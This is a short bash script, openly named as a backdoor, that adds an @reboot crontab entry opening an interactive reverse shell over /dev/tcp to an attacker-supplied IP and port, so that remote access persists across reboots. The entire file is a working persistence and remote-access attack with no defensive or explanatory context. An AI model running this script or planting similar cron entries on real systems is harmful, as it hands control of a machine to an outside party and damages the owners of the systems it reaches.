#!/bin/bash
# scheduled_backdoor.sh - Schedule a backdoor reverse shell via cron.
if [ -z "$1" ] || [ -z "$2" ]; then
  echo "Usage: $0 <attacker_ip> <attacker_port>"
  exit 1
fi
echo "Adding scheduled backdoor to crontab for reverse shell to $1:$2..."
(crontab -l 2>/dev/null; echo "@reboot bash -i >& /dev/tcp/$1/$2 0>&1") | crontab -
echo "Scheduled backdoor added."
